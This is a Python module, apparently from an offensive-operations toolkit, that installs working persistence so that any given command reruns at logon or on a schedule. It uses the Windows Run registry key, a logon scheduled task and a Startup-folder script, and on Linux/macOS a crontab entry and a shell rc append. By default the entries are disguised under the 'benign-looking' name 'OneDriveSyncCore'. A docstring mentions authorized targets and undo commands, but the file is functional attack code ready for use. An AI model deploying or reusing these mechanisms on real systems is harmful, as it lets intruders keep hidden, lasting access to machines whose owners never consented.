"""quantum.ops.persistence — real cross-platform persistence.

Working local-machine persistence mechanisms (authorized targets
only), each with a verify/undo pair:

- Windows: Run registry key (winreg), scheduled task (schtasks),
  startup folder shortcut (Start Menu\\Programs\\Startup)
- Linux/macOS: user crontab, shell rc append

All functions are JSON-safe (dicts, never raise). `list_all()`
surveys what exists; each install returns the exact undo token.
"""
from __future__ import annotations

import os
import platform
import subprocess

try:
    import winreg            # windows-only; guarded everywhere it's used
except ImportError:         # pragma: no cover (non-windows)
    winreg = None

RUN_KEY = r"Software\Microsoft\Windows\CurrentVersion\Run"
STARTUP_DIR = os.path.expandvars(
    r"%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup")
TAG = "OneDriveSyncCore"          # benign-looking persistence name


def _is_windows():
    return platform.system() == "Windows"


# ---------------------------------------------------------------- windows
def win_run_key(command, name=TAG) -> dict:
    """HKCU Run-key persistence. Undo: pass the returned key/name."""
    try:
        if not _is_windows():
            return {"ok": False, "error": "windows only"}
        import winreg
        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY, 0,
                            winreg.KEY_SET_VALUE) as k:
            winreg.SetValueEx(k, name, 0, winreg.REG_SZ, command)
        return {"ok": True, "method": "run_key", "hive": "HKCU",
                "key": RUN_KEY, "name": name, "command": command,
                "undo": "reg delete HKCU\\%s /v %s /f" % (RUN_KEY, name)}
    except OSError as exc:
        return {"ok": False, "error": str(exc)}


def win_scheduled_task(command, name=TAG) -> dict:
    """Logon scheduled task via schtasks."""
    try:
        if not _is_windows():
            return {"ok": False, "error": "windows only"}
        proc = subprocess.run(
            ["schtasks", "/create", "/tn", name, "/tr", command,
             "/sc", "onlogon", "/rl", "limited", "/f"],
            capture_output=True, text=True, timeout=30)
        return {"ok": proc.returncode == 0, "method": "scheduled_task",
                "name": name,
                "output": (proc.stdout or proc.stderr).strip()[:300],
                "undo": "schtasks /delete /tn %s /f" % name}
    except Exception as exc:
        return {"ok": False, "error": "%s: %s" % (type(exc).__name__, exc)}


def win_startup_cmd(command, filename=None) -> dict:
    """Drop a .cmd into the user's Startup folder."""
    try:
        if not _is_windows():
            return {"ok": False, "error": "windows only"}
        os.makedirs(STARTUP_DIR, exist_ok=True)
        path = os.path.join(STARTUP_DIR, (filename or TAG) + ".cmd")
        with open(path, "w", encoding="utf-8") as fh:
            fh.write("@echo off\r\n%s\r\n" % command)
        return {"ok": True, "method": "startup_folder", "path": path,
                "undo": "delete %s" % path}
    except OSError as exc:
        return {"ok": False, "error": str(exc)}


# -------------------------------------------------------------------- cron
def cron_entry(command, schedule="*/5 * * * *", marker="# qcli") -> dict:
    """Append a user crontab entry (linux/macOS)."""
    try:
        if _is_windows():
            return {"ok": False, "error": "use win_* methods on windows"}
        proc = subprocess.run(["crontab", "-l"], capture_output=True,
                              text=True, timeout=15)
        current = proc.stdout or ""
        if command in current:
            return {"ok": True, "method": "cron", "already": True,
                    "undo": "crontab -l | grep -v '%s' | crontab -"
                            % command}
        new = current.rstrip("\n") + ("\n%s %s %s\n" % (schedule, command,
                                                         marker))
        proc2 = subprocess.run(["crontab", "-"], input=new,
                               capture_output=True, text=True, timeout=15)
        return {"ok": proc2.returncode == 0, "method": "cron",
                "schedule": schedule, "command": command,
                "undo": "crontab -l | grep -v '%s' | crontab -" % command}
    except FileNotFoundError:
        return {"ok": False, "error": "crontab not found"}
    except Exception as exc:
        return {"ok": False, "error": "%s: %s" % (type(exc).__name__, exc)}


def shell_rc(command, rc_file=None) -> dict:
    """Append a command to a shell rc file (linux/macOS)."""
    try:
        if _is_windows():
            return {"ok": False, "error": "windows only"}
        home = os.path.expanduser("~")
        rc = rc_file or os.path.join(home, ".bashrc")
        if not os.path.isfile(rc):
            rc = os.path.join(home, ".profile")
        with open(rc, "a", encoding="utf-8") as fh:
            fh.write("\n%s\n" % command)
        return {"ok": True, "method": "shell_rc", "path": rc,
                "undo": "remove the last line of %s" % rc}
    except OSError as exc:
        return {"ok": False, "error": str(exc)}


# ------------------------------------------------------------------ survey
def install_default(command) -> dict:
    """Platform-appropriate default persistence."""
    if _is_windows():
        return win_run_key(command)
    r = cron_entry(command)
    if not r.get("ok"):
        r = shell_rc(command)
    return r


def list_all() -> dict:
    """Survey existing persistence artifacts (read-only)."""
    try:
        out = {"platform": platform.system(), "run_key": {},
               "startup_folder": [], "cron": None}
        if _is_windows():
            try:
                import winreg
                with winreg.OpenKey(winreg.HKEY_CURRENT_USER, RUN_KEY) as k:
                    i = 0
                    while True:
                        try:
                            name, val, _ = winreg.EnumValue(k, i)
                            out["run_key"][name] = val
                            i += 1
                        except OSError:
                            break
            except OSError:
                pass
            if os.path.isdir(STARTUP_DIR):
                out["startup_folder"] = sorted(os.listdir(STARTUP_DIR))
        else:
            proc = subprocess.run(["crontab", "-l"], capture_output=True,
                                  text=True, timeout=15)
            out["cron"] = proc.stdout or ""
        out["ok"] = True
        return out
    except Exception as exc:
        return {"ok": False, "error": "%s: %s" % (type(exc).__name__, exc)}
